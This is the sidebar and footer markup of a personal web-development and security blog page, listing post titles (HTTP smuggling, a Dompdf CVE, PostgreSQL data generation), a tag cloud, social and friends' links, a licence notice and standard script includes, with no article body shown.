                     <a class="list-group-item" href="/postgresql/english/2017/06/26/postgresql_advanced_generate_series/">
                     <h4>PostgreSQL, advanced use of generate_series for data generation</h4>
                     <p>filling thousands of random realistic data rows.</p>
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2016/12/19/security_dompdf_rce/">
                     <h4>Web Security, Dompdf security issues details</h4>
                     <p>details of december 2015's 3 CVE in dompdf, with one RCE.</p>
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/">
                     <h4>Web Security, using bad HTML to escape from a DIV</h4>
                     <p>Break HTML layouts with only bad HTML and the browser's help.</p>
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2015/10/04/http_smuggling_in_2015_part_one/">
                     <h4>Checking HTTP Smuggling issues in 2015 - Part1</h4>
                     <p>First part of the 2015 HTTP Smuggling articles. Injecting HTTP in HTTP, the theory.</p>
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2015/03/25/nginx-integer_truncation/">
                     <h4>Nginx Integer Truncation</h4>
                     <p>Exploitation of Integer Overflow with the HTTP Content length Header</p>
                     </a>
                  
                </div>
              </div>
              
      
              <div class="sideBarListBox">
                <div class="page-header">
                <h3>Latest posts</h3>
                </div>
                <div class="list-group" role="navigation">
                  
                     <a class="list-group-item" href="/security/english/2018/07/03/security_pound_http_smuggling/">
                     Security: HTTP Smuggling, Apsis Pound load balancer
                     </a>
                  
                     <a class="list-group-item" href="/postgresql/english/2017/06/26/postgresql_advanced_generate_series/">
                     PostgreSQL, advanced use of generate_series for data generation
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2016/12/19/security_dompdf_rce/">
                     Web Security, Dompdf security issues details
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/">
                     Web Security, using bad HTML to escape from a DIV
                     </a>
                  
                     <a class="list-group-item" href="/security/english/2015/10/04/http_smuggling_in_2015_part_one/">
                     Checking HTTP Smuggling issues in 2015 - Part1
                     </a>
                  
                </div>
              </div>
            
              <div class="sideBarListBox">
                <div class="page-header">
                <h3>Tags</h3>
                </div>

                <div class="tagcloud">
                <a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
<a style='font-size: 12px' class='taglink' href='/tag/Js/'>Js</a>
<a style='font-size: 12px' class='taglink' href='/tag/Accumulated/'>Accumulated</a>
<a style='font-size: 12px' class='taglink' href='/tag/Pound/'>Pound</a>
<a style='font-size: 18px' class='taglink' href='/tag/Injection/'>Injection</a>
<a style='font-size: 31px' class='taglink' href='/tag/Drupal/'>Drupal</a>
<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
<a style='font-size: 22px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
<a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
<a style='font-size: 28px' class='taglink' href='/tag/Performance/'>Performance</a>
<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
<a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
<a style='font-size: 31px' class='taglink' href='/tag/PHP/'>PHP</a>
<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
<a style='font-size: 12px' class='taglink' href='/tag/Cache/'>Cache</a>
<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
<a style='font-size: 18px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
<a style='font-size: 18px' class='taglink' href='/tag/jinja/'>jinja</a>
<a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
<a style='font-size: 22px' class='taglink' href='/tag/mod_rewrite/'>mod_rewrite</a>
<a style='font-size: 30px' class='taglink' href='/tag/HTTP/'>HTTP</a>
<a style='font-size: 18px' class='taglink' href='/tag/RewriteMap/'>RewriteMap</a>
<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
<a style='font-size: 18px' class='taglink' href='/tag/CVE/'>CVE</a>
<a style='font-size: 22px' class='taglink' href='/tag/Nginx/'>Nginx</a>
<a style='font-size: 24px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
<a style='font-size: 32px' class='taglink' href='/tag/Apache/'>Apache</a>
<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
<a style='font-size: 22px' class='taglink' href='/tag/Proxy/'>Proxy</a>
<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>

                </div>
              </div>
          </div> <!-- end sideBarContent -->
            
            <div class="sideBarMore">
              <div class="page-header">
              <h3>About</h3>
              </div>
                <a href="https://twitter.com/regilero" target="_blank"><img src="/theme/img/twitter_thumb.png" width="48" height="48" alt="Twitter regilero" title="Twitter regilero"></a>
                <a href="https://github.com/regilero" target="_blank"><img src="/theme/img/github_thumb.png" width="48" height="48" alt="Github regilero" title="Github regilero"></a>
                <a href="https://plus.google.com/111280074129555323484?rel=author" target="_blank"><img src="/theme/img/google-plus-thumb.png" width="48" height="48" alt="G+" title="G+"></a>
                <a href="http://www.flickr.com/photos/regilero/" target="_blank"><img src="/theme/img/flickr_thumb.png" width="48" height="48" alt="Flickr photos" title="Flickr photos"></a>
                <a href="http://stackoverflow.com/users/550618/regilero" target="_blank"><img src="http://stackoverflow.com/users/flair/550618.png" width="208" height="58" alt="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers" title="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers"></a>
                <a href="https://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
            </div>
            <div class="sideBarItem">
              <h3>Some Friends</h3>
                <ul>
                  <li><a class="effect" target="_blank" href="http://makina-corpus.com/blog/metier/actu-metier">Blogs Makina Corpus<div class="cover-right"><img src="/theme/img/makinaorg.png" height="30" width="30"><img src="/theme/img/makinaorg_banner.png" height="30" width="117"></div></a></li>
                  <li><a class="effect" target="_blank" href="http://www.makina-corpus.com">Makina Corpus<div class="cover-right"><img src="/theme/img/makinacom.png" height="30" width="30"><img src="/theme/img/makinacom_banner.png" height="30" width="117"></div></a></li>
                  <li><a class="effect" target="_blank" href="http://blog.processus.org/">Pounard, processus.org<div class="cover-right"><img src="/theme/img/pounard.png" height="30" width="30"><img src="/theme/img/pounard_banner.png" height="30" width="117"></div></a></li>
                  <li><a class="effect" target="_blank" href="http://toutpt.github.io/" >Toupt<div class="cover-right"><img src="/theme/img/toupt.png" height="30" width="30"><img src="/theme/img/toupt_banner.png" height="30" width="117"></div></a></li>
                  <li><a class="effect" target="_blank" href="http://francoisgaudin.com/">François Gaudin<div class="cover-right"><img src="/theme/img/gaudin.png" height="30" width="30"><img src="/theme/img/gaudin_banner.png" height="30" width="117"></div></a></li>
                  <li><a class="effect" target="_blank" href="http://fle.github.io/">Florent Lebreton<div class="cover-right"><img src="/theme/img/fle.png" height="30" width="30"><img src="/theme/img/fle_banner.png" height="30" width="117"></div></a></li>
                </ul>
                <div class="clear"></div>
            </div>
         </div> <!-- end sidebar -->
        
       </div><!-- end row -->
       <div class="row">
         <div class="col-md-12" id="footer">
           <div class="panel panel-default">
             <div class=panel-footer">
          <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/fr/"><img alt="Licence Creative Commons" style="border-width:0" src="http://i.creativecommons.org/l/by-sa/3.0/fr/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">regilero's blog</span> est mis à disposition selon les termes de la <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/fr/">licence Creative Commons Attribution -  Partage dans les Mêmes Conditions 3.0 France</a>.<br />Fondé(e) sur une œuvre à <a xmlns:dct="http://purl.org/dc/terms/" href="http://regilero.github.io" rel="dct:source">http://regilero.github.io</a>.
              </div>
            </div>
         </div>
       </div><!-- end row -->
  </div>

    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<!--    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script> -->
    <script src="/theme/js/toc.min.js" ></script>
    <script src="/theme/js/effects.js" ></script>
   <script src="/theme/js/jquery.parallax.min.js"></script>
    <script src="/theme/bootstrap/js/bootstrap.min.js"></script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40859893-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
    </body>
</html>
